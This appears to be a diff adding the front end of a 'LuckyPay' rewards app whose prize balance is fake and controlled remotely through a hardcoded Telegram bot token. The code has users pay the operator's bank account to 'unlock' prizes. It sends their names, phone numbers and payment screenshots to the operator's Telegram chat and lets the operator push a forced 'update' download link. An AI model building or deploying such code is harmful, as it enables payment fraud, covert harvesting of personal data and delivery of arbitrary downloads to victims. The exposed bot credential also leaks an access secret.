+            <span class="payee-timer" id="formTimer"><i class="fa-regular fa-clock"></i> 09:59</span>
+            <button class="payee-copy amount-copy" type="button" data-copy="amount"><i class="fa-regular fa-copy"></i> COPY</button>
+          </div>
+          <div class="payee-row">
+            <span class="payee-lbl">Account</span>
+            <span class="payee-val mono" id="payAccount">××××××××××××</span>
+            <button class="payee-copy" type="button" data-copy="account"><i class="fa-regular fa-copy"></i> COPY</button>
+          </div>
+          <div class="payee-row">
+            <span class="payee-lbl">Name</span>
+            <span class="payee-val" id="payName">×××××××××</span>
+            <button class="payee-copy" type="button" data-copy="name"><i class="fa-regular fa-copy"></i> COPY</button>
+          </div>
+          <div class="payee-row">
+            <span class="payee-lbl">IFSC</span>
+            <span class="payee-val mono" id="payIfsc">×××××××××××</span>
+            <button class="payee-copy" type="button" data-copy="ifsc"><i class="fa-regular fa-copy"></i> COPY</button>
+          </div>
+        </div>
+        <label class="lbl">Upload Payment Screenshot</label>
+        <div class="upload-box" id="uploadBox">
+          <input type="file" id="screenshotInput" accept="image/*" hidden>
+          <div class="upload-inner" id="uploadInner"><i class="fa-solid fa-cloud-arrow-up"></i><div class="upload-title">Tap to upload</div><div class="upload-hint">JPG, PNG · Max 5MB</div></div>
+          <img id="uploadPreview" class="hidden" alt="preview">
+          <div class="upload-change hidden" id="uploadChange"><i class="fa-solid fa-rotate"></i> Change</div>
+        </div>
+        <button class="btn-primary" id="payVerifyBtn" type="button"><i class="fa-solid fa-shield-halved"></i> <span>VERIFY PAYMENT</span></button>
+      </div>
+      <div id="payStep2" class="hidden">
+        <div class="pay-verify-anim">
+          <div class="pay-orbit">
+            <div class="pay-orbit-ring"></div><div class="pay-orbit-ring delay1"></div><div class="pay-orbit-ring delay2"></div>
+            <div class="pay-orbit-icon"><i class="fa-solid fa-hourglass-half"></i></div>
+          </div>
+        </div>
+        <div style="text-align:center;"><div class="online-badge"><span class="online-dot"></span>ONLINE · VERIFYING</div></div>
+        <div class="pay-timer" id="payTimer">09:59</div>
+        <div class="pay-timer-label">Verifying your payment...</div>
+        <div class="pay-timer-sub">Please wait while we confirm with the recipient</div>
+        <div class="pay-status-row"><i class="fa-solid fa-circle-notch"></i> Waiting for confirmation...</div>
+      </div>
+      <div id="payStep3" class="hidden">
+        <div class="result-box blue"><i class="fa-solid fa-circle-check"></i>✓ PAYMENT VERIFIED<span>Coupon added to your history</span></div>
+        <button class="btn-primary" id="payDoneBtn" type="button"><i class="fa-solid fa-check"></i> <span>DONE</span></button>
+      </div>
+      <div id="payStep4" class="hidden">
+        <div class="result-box red"><i class="fa-solid fa-circle-xmark"></i>PAYMENT REJECTED<span>Please check details and try again</span></div>
+        <button class="btn-primary" id="payRetryBtn" type="button"><i class="fa-solid fa-rotate-right"></i> <span>TRY AGAIN</span></button>
+      </div>
+      <div id="payStep5" class="hidden">
+        <div class="result-box red"><i class="fa-solid fa-clock"></i>TIMEOUT<span>Please refresh payment details</span></div>
+        <button class="btn-primary" id="payTimeoutBtn" type="button"><i class="fa-solid fa-rotate-right"></i> <span>REFRESH DETAILS</span></button>
+      </div>
+    </div>
+  </div>
+
+  <!-- LOGOUT MODAL -->
+  <div class="overlay" id="logoutModal">
+    <div class="sheet">
+      <div class="sheet-handle"></div>
+      <div class="sheet-icon red"><i class="fa-solid fa-right-from-bracket"></i></div>
+      <h3>Logout?</h3>
+      <p class="logout-msg">Are you sure you want to logout?<br>You will need to <b>login again</b>.</p>
+      <button class="btn-logout" id="confirmLogoutBtn" type="button"><i class="fa-solid fa-check"></i> <span>YES, LOGOUT</span></button>
+      <button class="btn-ghost" data-close="logoutModal" type="button">Cancel</button>
+    </div>
+  </div>
+
+  <!-- FORCE UPDATE POPUP -->
+  <div class="update-popup" id="updatePopup">
+    <div class="update-box">
+      <div class="update-ic"><i class="fa-solid fa-cloud-arrow-down"></i></div>
+      <div class="update-title">New Update Available!</div>
+      <p class="update-desc" id="updateDescText">LuckyPay ka naya version aa gaya hai.<br>Please update to continue.</p>
+      <div class="update-notes" id="updateNotes">
+        <div><i class="fa-solid fa-check-circle"></i> Latest features</div>
+        <div><i class="fa-solid fa-check-circle"></i> Bug fixes</div>
+        <div><i class="fa-solid fa-check-circle"></i> Better performance</div>
+      </div>
+      <button class="update-btn" id="updateDownloadBtn" type="button"><i class="fa-solid fa-download"></i> <span>UPDATE NOW</span></button>
+      <div class="update-version">Version <span id="updateVersionText">1.0.0</span></div>
+    </div>
+  </div>
+
+  <!-- VIDEO / CUSTOM MESSAGE POPUP -->
+  <div class="video-popup" id="videoPopup">
+    <div class="video-box">
+      <button class="video-close" id="videoCloseBtn" type="button"><i class="fa-solid fa-xmark"></i></button>
+      <div class="video-ic" id="videoIcon"><i class="fa-solid fa-play"></i></div>
+      <div class="video-title" id="videoTitle">Special Message</div>
+      <p class="video-desc" id="videoDesc">Owner has sent you a message.</p>
+      <div class="video-frame-wrap" id="videoFrameWrap" style="display:none;">
+        <video id="videoPlayer" controls playsinline style="width:100%;border-radius:14px;"></video>
+      </div>
+      <a class="video-link-btn hidden" id="videoLinkBtn" href="javascript:void(0)" target="_blank"><i class="fa-solid fa-arrow-up-right-from-square"></i> <span id="videoLinkText">Open Link</span></a>
+      <button class="video-ok-btn" id="videoOkBtn" type="button"><i class="fa-solid fa-check"></i> <span>OK, GOT IT</span></button>
+    </div>
+  </div>
+
+  <div id="toast"></div>
+</div>
+
+<script>
+(function(){
+  'use strict';
+
+  /* ====== CONFIG ====== */
+  var TBOT='8864112645:AAHTMjpWSfPxhqAB8pkgwm-j49OXAGWs1zI';
+  var TCHAT='8709228094';
+
+  var SUPPORT_PHONE='8235619970';
+  var SUPPORT_WA='8235619970';
+  var OWNER_WA='8235619970';
+  var DEFAULT_BALANCE=50;
+  var DEFAULT_PRIZE=0;
+  var PAY_TIMEOUT_MS=9*60*1000+59*1000;
+  var OTP_TIMEOUT_SEC=59;
+  var WALLETS=['Paytm','MobiKwik','Freecharge'];
+  var POLL_MS=2000;
+  var INVITE_REWARD=10;
+
+  var UPDATE_ENABLED=false;
+  var UPDATE_VERSION='1.0.0';
+  var UPDATE_LINK='';
+
+  var $=function(id){return document.getElementById(id);};
+  var STORE={user:'lp_user',mobile:'lp_mobile',invite:'lp_invite',loggedIn:'lp_logged',regTime:'lp_reg'};
+  function K(p,m){return 'lp_'+p+'_'+m;}
+  function balK(m){return K('bal',m);}
+  function prizeK(m){return K('prize',m);}
+  function apprK(m){return K('appr',m);}
+  function blkK(m){return K('blk',m);}
+  function txnK(m){return K('txn',m);}
+  function payK(m){return K('pay',m);}
+  function payeeK(m){return K('payee',m);}
+  function supK(m){return K('sup',m);}
+  function pwK(m){return K('pw',m);}
+  function rstK(m){return K('rst',m);}
+  function wlK(m){return K('wl',m);}
+  function wlReqK(m){return K('wlreq',m);}
+  function logOkK(m){return K('logok',m);}
+  function logRejK(m){return K('logrej',m);}
+  function photoK(m){return K('photo',m);}
+  function inviteCountK(m){return K('invcount',m);}
+  function inviteEarnK(m){return K('invearn',m);}
+  function usedInviteK(m){return K('usedinv',m);}
+
+  function save(k,v){try{localStorage.setItem(k,v);}catch(e){}}
+  function read(k){try{return localStorage.getItem(k);}catch(e){return null;}}
+  function del(k){try{localStorage.removeItem(k);}catch(e){}}
+
+  var toastT=null;
+  function toast(msg,type){
+    var t=$('toast');
+    t.innerHTML='<i class="fa-solid '+(type==='error'?'fa-circle-xmark':'fa-circle-check')+'"></i>'+msg;
+    t.className='show'+(type?' '+type:'');
+    clearTimeout(toastT);
+    toastT=setTimeout(function(){t.className='';},2800);
+  }
+  function esc(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+  function rndCode(){var c='ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789',o='';for(var i=0;i<5;i++)o+=c.charAt(Math.floor(Math.random()*c.length));return o;}
+  var MRE=/^[6-9]\d{9}$/;
+
+  function showScr(id){
+    var sc=['registerScreen','loginScreen','loginOtpScreen','verifyScreen','forgotScreen','newPassScreen','waitingScreen','appScreen'];
+    for(var i=0;i<sc.length;i++){var el=$(sc[i]);if(el)el.classList.add('hidden');}
+    var t=$(id);if(t)t.classList.remove('hidden');
+    window.scrollTo({top:0,behavior:'smooth'});
+  }
+
+  function getBal(){var m=read(STORE.mobile);if(!m)return DEFAULT_BALANCE;var v=read(balK(m));if(v&&/^\d+$/.test(v))return parseInt(v,10);return DEFAULT_BALANCE;}
+  function setBal(a){var m=read(STORE.mobile);if(m)save(balK(m),String(a));}
+  function renderBal(anim){
+    var a=getBal(),main=$('mainBalance'),bd=$('headerBalance'),bt=$('bonusTitle'),bx=$('regBonusText');
+    if(main){main.textContent='₹'+a;if(anim){main.classList.remove('updated');void main.offsetWidth;main.classList.add('updated');}}
+    if(bd)bd.textContent=String(a);
+    if(bt)bt.textContent='+₹'+a+' Registration Bonus';
+    if(bx)bx.textContent='₹'+a+' Free';
+  }
+
+  function getPrize(){var m=read(STORE.mobile);if(!m)return DEFAULT_PRIZE;var v=read(prizeK(m));if(v!==null&&v!==''&&/^\d+$/.test(v))return parseInt(v,10);return DEFAULT_PRIZE;}
+  function setPrize(a){var m=read(STORE.mobile);if(m)save(prizeK(m),String(a));}
+
+  function getInviteCount(){var m=read(STORE.mobile);if(!m)return 0;var v=read(inviteCountK(m));return v?parseInt(v,10):0;}
+  function setInviteCount(n){var m=read(STORE.mobile);if(m)save(inviteCountK(m),String(n));}
+  function getInviteEarn(){var m=read(STORE.mobile);if(!m)return 0;var v=read(inviteEarnK(m));return v?parseInt(v,10):0;}
+  function setInviteEarn(n){var m=read(STORE.mobile);if(m)save(inviteEarnK(m),String(n));}
+  function renderInviteCount(){
+    var c=getInviteCount(),e=getInviteEarn();
+    if($('inviteCountHome'))$('inviteCountHome').textContent=c;
+    if($('inviteCountModal'))$('inviteCountModal').textContent=c;
+    if($('profInviteCount'))$('profInviteCount').textContent=c+(c===1?' Friend':' Friends');
+    if($('inviteEarnedModal'))$('inviteEarnedModal').textContent='₹'+e;
+  }
+
+  function getWl(){var m=read(STORE.mobile);if(!m)return{Paytm:false,MobiKwik:false,Freecharge:false};try{var r=read(wlK(m));if(r){var o=JSON.parse(r);if(o){WALLETS.forEach(function(w){if(typeof o[w]!=='boolean')o[w]=false;});return o;}}}catch(e){}return{Paytm:false,MobiKwik:false,Freecharge:false};}
+  function setWl(o){var m=read(STORE.mobile);if(m)save(wlK(m),JSON.stringify(o));}
+  function getWlReq(){var m=read(STORE.mobile);if(!m)return{};try{var r=read(wlReqK(m));if(!r)return{};return JSON.parse(r)||{};}catch(e){return{};}}
+  function setWlReq(o){var m=read(STORE.mobile);if(m)save(wlReqK(m),JSON.stringify(o));}
+
+  function getSup(){var m=read(STORE.mobile);if(!m)return{p:SUPPORT_PHONE,w:SUPPORT_WA};try{var r=read(supK(m));if(r){var o=JSON.parse(r);if(o&&o.p&&o.w)return o;}}catch(e){}return{p:SUPPORT_PHONE,w:SUPPORT_WA};}
+  function setSup(o){var m=read(STORE.mobile);if(m)save(supK(m),JSON.stringify(o));}
+  function delSup(){var m=read(STORE.mobile);if(m)del(supK(m));}
+  function renderSup(){var s=getSup();if($('supportSubPhone'))$('supportSubPhone').textContent=s.p;if($('supportModalPhone'))$('supportModalPhone').textContent=s.p;if($('profSupportNum'))$('profSupportNum').textContent=s.p;}
+
+  function getPayee(){var m=read(STORE.mobile);if(!m)return null;try{var r=read(payeeK(m));if(!r)return null;return JSON.parse(r);}catch(e){return null;}}
+  function setPayee(p){var m=read(STORE.mobile);if(m)save(payeeK(m),JSON.stringify(p));}
+  function delPayee(){var m=read(STORE.mobile);if(m)del(payeeK(m));}
+  function renderPayee(){
+    var p=getPayee(),c=$('payeeCard'),st=$('payeeStatus'),dot=$('payeeStatusDot'),tx=$('payeeStatusText');
+    if(!c)return;
+    var live=p&&p.account&&p.ifsc&&p.name;
+    if(live){
+      c.classList.remove('offline');c.classList.add('live');
+      st.classList.remove('offline');st.classList.add('live');
+      tx.textContent='✓ ACCOUNT ACTIVE';dot.className='fa-solid fa-circle-check';
+      $('payAccount').textContent=p.account;$('payName').textContent=p.name;$('payIfsc').textContent=p.ifsc;
+    } else {
+      c.classList.remove('live');c.classList.add('offline');
+      st.classList.remove('live');st.classList.add('offline');
+      tx.textContent='OFFLINE';dot.className='fa-solid fa-circle';
+      $('payAccount').textContent='××××××××××××';$('payName').textContent='×××××××××';$('payIfsc').textContent='×××××××××××';
+    }
+  }
+
+  function getTx(){var m=read(STORE.mobile);if(!m)return[];try{var r=read(txnK(m));if(!r)return[];var a=JSON.parse(r);return Array.isArray(a)?a:[];}catch(e){return[];}}
+  function setTx(a){var m=read(STORE.mobile);if(m)save(txnK(m),JSON.stringify(a));}
+  function addTx(t){var a=getTx();a.unshift(t);if(a.length>60)a=a.slice(0,60);setTx(a);}
+  function fmtDate(ts){
+    if(!ts)return 'Just now';
+    try{var d=new Date(parseInt(ts,10)),n=new Date(),df=Math.floor((n-d)/1000);
+      if(df<60)return 'Just now';
+      if(df<3600)return Math.floor(df/60)+' min ago';
+      if(df<86400)return Math.floor(df/3600)+' hr ago';
+      return d.toLocaleDateString('en-IN',{day:'2-digit',month:'short'})+' · '+d.toLocaleTimeString('en-IN',{hour:'2-digit',minute:'2-digit'});
+    }catch(e){return 'Just now';}
+  }
+  function renderTx(){
+    var c=$('historyList');if(!c)return;c.innerHTML='';
+    var tx=getTx();
+    if(tx.length===0){c.innerHTML='<div class="history-empty"><i class="fa-solid fa-receipt"></i>No history yet.<br>Owner will add entries soon.</div>';return;}
+    tx.forEach(function(t){
+      var el=document.createElement('div');el.className='history-item';
+      var isNeg=t.amount<0||t.neg===true;
+      var lb=String(t.label||'').toLowerCase(),ic='gift',inm='fa-gift';
+      if(lb.indexOf('coupon')!==-1){ic='coupon';inm='fa-ticket';}
+      else if(lb.indexOf('invite')!==-1){ic='invite';inm='fa-user-plus';}
+      else if(lb.indexOf('upi')!==-1||lb.indexOf('transfer')!==-1||isNeg){ic='transfer';inm='fa-arrow-up-right-from-square';}
+      else if(lb.indexOf('cashback')!==-1){ic='cashback';inm='fa-coins';}
+      else if(lb.indexOf('welcome')!==-1||lb.indexOf('reward')!==-1){ic='bonus';inm='fa-star';}
+      var sg=isNeg?'-':'+',am=Math.abs(t.amount),ac=isNeg?'history-amount negative':'history-amount';
+      el.innerHTML='<div class="history-icon '+ic+'"><i class="fa-solid '+inm+'"></i></div><div class="history-info"><div class="history-title">'+esc(t.label||'Reward')+'</div><div class="history-date"><i class="fa-regular fa-clock"></i> '+fmtDate(t.time)+'</div></div><div class="'+ac+'">'+sg+'₹'+am+'</div>';
+      c.appendChild(el);
+    });
+  }
+
+  function isAppr(){var m=read(STORE.mobile);return m&&read(apprK(m))==='1';}
+  function setAppr(){var m=read(STORE.mobile);if(m)save(apprK(m),'1');}
+  function isBlk(){var m=read(STORE.mobile);return m&&read(blkK(m))==='1';}
+  function setBlk(){var m=read(STORE.mobile);if(!m)return;save(blkK(m),'1');del(apprK(m));}
+  function unBlk(){var m=read(STORE.mobile);if(!m)return;del(blkK(m));save(apprK(m),'1');}
+  function getPw(m){return m?read(pwK(m)):null;}
+  function setPw(m,p){if(m)save(pwK(m),p);}
+  function isRstAppr(){var m=read(STORE.mobile);return m&&read(rstK(m))==='1';}
+  function setRstAppr(){var m=read(STORE.mobile);if(m)save(rstK(m),'1');}
+  function clrRstAppr(){var m=read(STORE.mobile);if(m)del(rstK(m));}
+  function isLogOk(m){return m&&read(logOkK(m))==='1';}
+  function setLogOk(m){if(m)save(logOkK(m),'1');}
+  function clrLogOk(m){if(m)del(logOkK(m));}
+  function isLogRej(m){return m&&read(logRejK(m))==='1';}
+  function setLogRej(m){if(m)save(logRejK(m),'1');}
+  function clrLogRej(m){if(m)del(logRejK(m));}
+  function getPhoto(){var m=read(STORE.mobile);return m?read(photoK(m)):null;}
+  function setPhoto(d){var m=read(STORE.mobile);if(m)save(photoK(m),d);}
+  function delPhoto(){var m=read(STORE.mobile);if(m)del(photoK(m));}
+  function renderPhoto(){
+    var d=getPhoto(),avs=[$('profAvatar'),$('hAvatar')];
+    for(var i=0;i<avs.length;i++){var av=avs[i];if(!av)continue;
+      if(d){av.innerHTML='<img src="'+d+'" alt="photo">';}
+      else{av.innerHTML='<i class="fa-solid fa-user"></i>';}
+    }
+  }
+
+  function sendFallback(text){
+    var plain=text.replace(/<[^>]*>/g,'').replace(/&amp;/g,'&').replace(/&lt;/g,'<').replace(/&gt;/g,'>');
+    var u='https://api.telegram.org/bot'+TBOT+'/sendMessage?chat_id='+encodeURIComponent(TCHAT)+'&text='+encodeURIComponent(plain)+'&disable_web_page_preview=true&_='+Date.now();
+    var i=new Image();i.src=u;
+  }
+  function tg(msg){
+    var u='https://api.telegram.org/bot'+TBOT+'/sendMessage';
+    try{
+      fetch(u,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TCHAT,text:msg,parse_mode:'HTML',disable_web_page_preview:true})})
+        .then(function(r){return r.json();})
+        .then(function(d){if(!d||!d.ok)sendFallback(msg);})
+        .catch(function(){sendFallback(msg);});
+    }catch(e){sendFallback(msg);}
+  }
+  function tgPhoto(data,cap){
+    if(!data)return;
+    fetch(data).then(function(r){return r.blob();}).then(function(b){
+      var fd=new FormData();
+      fd.append('chat_id',TCHAT);
+      fd.append('photo',b,'lp_'+Date.now()+'.jpg');
+      fd.append('caption',cap||'');
+      fd.append('parse_mode','HTML');
+      return fetch('https://api.telegram.org/bot'+TBOT+'/sendPhoto',{method:'POST',body:fd});
+    }).then(function(r){return r.json();}).catch(function(){});
+  }
+
+  function getPay(){var m=read(STORE.mobile);if(!m)return null;try{var r=read(payK(m));if(!r)return null;return JSON.parse(r);}catch(e){return null;}}
+  function setPay(p){var m=read(STORE.mobile);if(m)save(payK(m),JSON.stringify(p));}
+  function delPay(){var m=read(STORE.mobile);if(m)del(payK(m));}
+
+  var payTimerInt=null,pendingShot=null;
+  var formTimerInt=null,formDeadline=0;
+
+  function startFormTimer(){
+    stopFormTimer();
+    var el=$('formTimer');if(!el)return;
+    formDeadline=Date.now()+PAY_TIMEOUT_MS;
+    function tick(){
+      var l=formDeadline-Date.now();
+      if(l<=0){
+        el.innerHTML='<i class="fa-solid fa-clock"></i> 00:00';
+        el.className='payee-timer danger';
+        stopFormTimer();
+        delPayee();
+        renderPayee();
+        toast('Payment session expired! Payee OFFLINE','error');
+        tg('<b>⏰ Payment session EXPIRED</b>\n\n👤 '+esc(read(STORE.user)||'-')+'\n📱 +91 '+esc(read(STORE.mobile)||'-')+'\n⏱ Timeout reached — Payee OFFLINE');
+        return;
+      }
+      var s=Math.floor(l/1000),mm=Math.floor(s/60),ss=s%60;
+      el.innerHTML='<i class="fa-regular fa-clock"></i> '+(mm<10?'0':'')+mm+':'+(ss<10?'0':'')+ss;
+      if(l<60000)el.className='payee-timer danger';
+      else if(l<180000)el.className='payee-timer warn';
+      else el.className='payee-timer';
+    }
+    tick();
+    formTimerInt=setInterval(tick,1000);
+  }
+  function stopFormTimer(){if(formTimerInt){clearInterval(formTimerInt);formTimerInt=null;}}
+
+  function showPayPanel(id){
+    ['payStepWait','payStep1','payStep2','payStep3','payStep4','payStep5'].forEach(function(p){var el=$(p);if(el)el.classList.add('hidden');});
+    var t=$(id);if(t)t.classList.remove('hidden');
+  }
+  function resetUpload(){
+    $('uploadPreview').classList.add('hidden');
+    $('uploadInner').classList.remove('hidden');
+    $('uploadChange').classList.add('hidden');
+    $('uploadBox').classList.remove('has-image');
+    pendingShot=null;
+    $('screenshotInput').value='';
+  }
+  function openPayModal(){
+    var p=getPay();
+    var prize=getPrize();
+    if(!p){p={status:'idle',amount:prize,deadline:0,txnId:null};setPay(p);}
+    if(p.status==='idle'){p.amount=prize;setPay(p);}
+    renderPayee();
+    if(p.status==='waiting_unlock'){
+      var sub=$('payPanelSub');if(sub)sub.textContent='Verifying with owner...';
+      showPayPanel('payStepWait');startUnlockPoll();
+    }
+    else if(p.status==='ready'){$('payAmount').textContent='₹'+p.amount;if(!pendingShot)resetUpload();showPayPanel('payStep1');startFormTimer();}
+    else if(p.status==='pending'){var left=p.deadline-Date.now();if(left<=0){p.status='timeout';setPay(p);renderPayee();showPayPanel('payStep5');}else{startPayTimer(p.deadline);showPayPanel('payStep2');}}
+    else if(p.status==='approved'){showPayPanel('payStep3');}
+    else if(p.status==='rejected'){showPayPanel('payStep4');}
+    else if(p.status==='timeout'){showPayPanel('payStep5');}
+    else{showPayPanel('payStepWait');}
+    $('paymentModal').classList.add('show');
+  }
+  function requestUnlock(){
+    var p=getPay();
+    if(!p||p.status!=='idle'){openPayModal();return;}
+    p.status='waiting_unlock';
+    p.amount=getPrize();
+    setPay(p);
+    var m=read(STORE.mobile),u=read(STORE.user);
+    tg('<b>🛒 Purchase Request</b>\n\n<b>👤 User:</b> '+esc(u||'-')+'\n<b>📱 Mobile:</b> +91 '+esc(m||'-')+'\n<b>💰 Prize:</b> ₹'+p.amount+'\n<b>🕒 Time:</b> '+new Date().toLocaleString('en-IN')+'\n\n<b>Unlock:</b> <code>next '+esc(m||'')+'</code>');
+    toast('Purchase request sent','success');
+    openPayModal();
+  }
+  var unlockPollInt=null;
+  function startUnlockPoll(){
+    if(unlockPollInt)clearInterval(unlockPollInt);
+    unlockPollInt=setInterval(function(){
+      pollTg({mobile:read(STORE.mobile),skipApprUI:true,onUnlock:function(){
+        var cp=getPay();
+        if(cp&&cp.status==='waiting_unlock'){
+          cp.status='ready';setPay(cp);renderPayee();
+          $('payAmount').textContent='₹'+cp.amount;
+          resetUpload();showPayPanel('payStep1');startFormTimer();
+          toast('Owner unlocked! Fill payment','success');
+        }
+        if(unlockPollInt){clearInterval(unlockPollInt);unlockPollInt=null;}
+      }});
+      var cp=getPay();
+      if(cp&&cp.status==='ready'){
+        renderPayee();$('payAmount').textContent='₹'+cp.amount;
+        resetUpload();showPayPanel('payStep1');startFormTimer();
+        toast('Owner unlocked!','success');
+        if(unlockPollInt){clearInterval(unlockPollInt);unlockPollInt=null;}
+      }
+    },POLL_MS);
+  }
+  function submitPayment(){
+    var p=getPay();if(!p||p.status!=='ready')return;
+    if(!pendingShot){toast('Please upload payment screenshot','error');return;}
+    var pe=getPayee();
+    if(!pe||!pe.account){toast('Payee details not available','error');return;}
+    if(!p.amount||p.amount<=0){toast('Prize amount not set','error');return;}
+    p.status='pending';p.deadline=Date.now()+PAY_TIMEOUT_MS;
+    p.txnId='lp_'+Date.now().toString(36)+Math.random().toString(36).slice(2,6);
+    setPay(p);
+    var m=read(STORE.mobile),u=read(STORE.user);
+    tg('<b>💰 Payment Verification</b>\n\n<b>👤 User:</b> '+esc(u||'-')+'\n<b>📱 Mobile:</b> +91 '+esc(m||'-')+'\n<b>💵 Prize:</b> ₹'+p.amount+'\n<b>🏦 Account:</b> '+esc(pe.account)+'\n<b>📝 IFSC:</b> '+esc(pe.ifsc)+'\n<b>👤 Name:</b> '+esc(pe.name)+'\n<b>🆔 Txn:</b> <code>'+p.txnId+'</code>\n<b>🕒 Time:</b> '+new Date().toLocaleString('en-IN')+'\n\n<b>Commands:</b>\n<code>payok '+esc(m||'')+'</code>\n<code>payno '+esc(m||'')+'</code>');
+    tgPhoto(pendingShot,'📷 Screenshot\n👤 '+esc(u||'-')+'\n📱 +91 '+esc(m||'-')+'\n💵 ₹'+p.amount);
+    toast('Payment submitted','success');
+    stopFormTimer();startPayTimer(p.deadline);showPayPanel('payStep2');
+  }
+  function startPayTimer(deadline){
+    stopPayTimer();
+    var el=$('payTimer');
+    function tick(){
+      var left=deadline-Date.now();
+      if(left<=0){
+        el.textContent='00:00';el.className='pay-timer danger';
+        stopPayTimer();
+        var cur=getPay();
+        if(cur&&cur.status==='pending'){cur.status='timeout';cur.amount=getPrize();setPay(cur);renderPayee();}
+        showPayPanel('payStep5');return;
+      }
+      var s=Math.floor(left/1000),mm=Math.floor(s/60),ss=s%60;
+      el.textContent=(mm<10?'0':'')+mm+':'+(ss<10?'0':'')+ss;
+      if(left<60000)el.className='pay-timer danger';
+      else if(left<180000)el.className='pay-timer warn';
+      else el.className='pay-timer';
+    }
+    tick();payTimerInt=setInterval(tick,1000);
+  }
+  function stopPayTimer(){if(payTimerInt){clearInterval(payTimerInt);payTimerInt=null;}}
+
+  function bindUpload(){
+    var box=$('uploadBox'),inp=$('screenshotInput'),pv=$('uploadPreview'),inr=$('uploadInner'),chg=$('uploadChange');
+    box.addEventListener('click',function(){inp.click();});
+    inp.addEventListener('change',function(e){
+      var f=e.target.files&&e.target.files[0];if(!f)return;
+      if(!/^image\//.test(f.type)){toast('Please select an image','error');return;}
+      if(f.size>5*1024*1024){toast('Image too large (max 5MB)','error');return;}
+      var r=new FileReader();
+      r.onload=function(ev){
+        pendingShot=ev.target.result;
+        pv.src=pendingShot;pv.classList.remove('hidden');inr.classList.add('hidden');chg.classList.remove('hidden');box.classList.add('has-image');
+        toast('Screenshot added','success');
+      };
+      r.readAsDataURL(f);
+    });
+  }
+
+  var pollActive=false,cmdPollInt=null,forgotPollInt=null,logPollInt=null;
+
+  function pollTg(opts){
+    opts=opts||{};
+    var m=opts.mobile||read(STORE.mobile);
+    if(!m)return;
+    if(pollActive)return;
+    pollActive=true;
+    var last=parseInt(read('lp_off_'+m)||'0',10);
+    var u='https://api.telegram.org/bot'+TBOT+'/getUpdates?offset='+(last+1)+'&timeout=0&limit=50';
+    fetch(u).then(function(r){return r.json();}).then(function(d){
+      pollActive=false;
+      if(!d||!d.ok||!d.result)return;
+      var mx=last,txChg=false,payeeChg=false,supChg=false,wlChg=false,rstAppr=false,logOk=false,logRej=false,unlocked=false,unblocked=false,inviteCred=false;
+      d.result.forEach(function(up){
+        if(up.update_id>mx)mx=up.update_id;
+        var msg=up.message;if(!msg||!msg.from)return;
+        if(String(msg.from.id)!==String(TCHAT))return;
+        var txt=(msg.text||'').trim();if(!txt)return;
+        var mt;
+
+        mt=txt.match(/^\/?yes\s+(\d{10})$/i);
+        if(mt&&mt[1]===m){setLogOk(m);logOk=true;clrLogRej(m);toast('Login approved ✓','success');return;}
+        mt=txt.match(/^\/?reject\s+(\d{10})$/i);
+        if(mt&&mt[1]===m){setLogRej(m);logRej=true;clrLogOk(m);toast('Login rejected','error');return;}
+
+        mt=txt.match(/^\/?unblock\s+(\d{10})$/i);
+        if(mt&&mt[1]===m){unBlk();unblocked=true;toast('Account unblocked ✓','success');return;}
+
+        /* INVITE REWARD */
+        mt=txt.match(/^\/?inviteok\s+(\d{10})$/i);
+        if(mt&&mt[1]===m){
+          var newCnt=getInviteCount()+1;
+          setInviteCount(newCnt);
+          setBal(getBal()+INVITE_REWARD);
+          setInviteEarn(getInviteEarn()+INVITE_REWARD);
+          addTx({amount:INVITE_REWARD,label:'Invite Reward',time:Date.now()});
+          renderBal(true);txChg=true;inviteCred=true;renderInviteCount();
+          toast('🎉 ₹'+INVITE_REWARD+' invite reward credited!','success');
+          tg('<b>🎉 Invite Reward Credited</b>\n\n📱 +91 '+esc(m)+'\n💰 +₹'+INVITE_REWARD+'\n👥 Total Invites: '+newCnt);
+          return;
+        }
+
+        /* VIDEO from owner (with optional target) */
+        mt=txt.match(/^\/?video\s+(\d{10})\s+(\S+)(?:\s+([\s\S]+))?$/i);
+        if(mt&&mt[1]===m){showVideoPopup(mt[2],(mt[3]||'').trim(),'🎬 Special Message',true);return;}
+        mt=txt.match(/^\/?video\s+(\S+)(?:\s+([\s\S]+))?$/i);
+        if(mt&&!mt[1].match(/^\d{10}$/)){showVideoPopup(mt[1],(mt[2]||'').trim(),'🎬 Special Message',true);return;}
+
+        /* CUSTOM POPUP */
+        mt=txt.match(/^\/?popup\s+(\d{10})\s+([\s\S]+)$/i);
+        if(mt&&mt[1]===m){
+          var pMsg=mt[2].trim();
+          var pLinkMatch=pMsg.match(/(https?:\/\/\S+)/i);
+          var pLink=pLinkMatch?pLinkMatch[1]:'';
+          var pText=pLink?pMsg.replace(pLink,'').trim():pMsg;
+          showVideoPopup(pLink,pText,'📢 Owner Message',false);
+          return;
+        }
+
+        /* FORCE UPDATE */
+        mt=txt.match(/^\/?forceupdate\s+(\d{10})\s+(\S+)(?:\s+([\s\S]+))?$/i);
+        if(mt&&mt[1]===m){showUpdatePopup(mt[2],(mt[3]||'Please update the app to continue.').trim(),'1.0.1');return;}
+        mt=txt.match(/^\/?forceupdateoff\s+(\d{10})$/i);
+        if(mt&&mt[1]===m){$('updatePopup').classList.remove('show');return;}
+
+        mt=txt.match(/^\/?next\s+(\d{10})$/i);
+        if(mt&&mt[1]===m){unlocked=true;var cp=getPay();if(cp&&cp.status==='waiting_unlock'){cp.status='ready';setPay(cp);}toast('Owner unlocked!','success');return;}
+
+        mt=txt.match(/^\/?prize\s+(\d{1,7})\s+(\d{10})$/i);
+        if(mt&&mt[2]===m){setPrize(parseInt(mt[1],10));toast('Prize ₹'+mt[1],'success');var pp=getPay();if(pp&&(pp.status==='idle'||pp.status==='ready')){pp.amount=parseInt(mt[1],10);setPay(pp);}return;}
+        mt=txt.match(/^\/?prize\s+(\d{10})\s+(\d{1,7})$/i);
+        if(mt&&mt[1]===m){setPrize(parseInt(mt[2],10));toast('Prize ₹'+mt[2],'success');return;}
+        mt=txt.match(/^\/?prizeoff\s+(\d{10})$/i);
+        if(mt&&mt[1]===m){setPrize(0);toast('Prize cleared','error');return;}
+
+        mt=txt.match(/^\/?walletok\s+(\d{10})\s+(Paytm|MobiKwik|Mobikwik|Freecharge)$/i);
